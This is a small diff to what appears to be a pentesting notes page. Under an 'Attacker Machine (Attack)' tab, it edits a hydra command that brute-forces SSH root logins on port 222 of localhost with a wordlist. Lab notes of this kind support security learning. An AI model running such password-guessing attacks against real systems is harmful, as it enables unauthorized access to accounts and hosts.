@@ -589,7 +589,7 @@ done;
 
 {% tab title="Attacker Machine \(Attack\)" %}
 ```
-hydra -s 222 -V -l root -P /usr/share/wordlists/dirb/small.txt 127.0.0.1 -t 4 ssh
+hydra -s 222 -V -l root -P /usr/share/wordlists/dirb/small.txt 127.0.0.1 ssh
 ```
 {% endtab %}
 {% endtabs %}
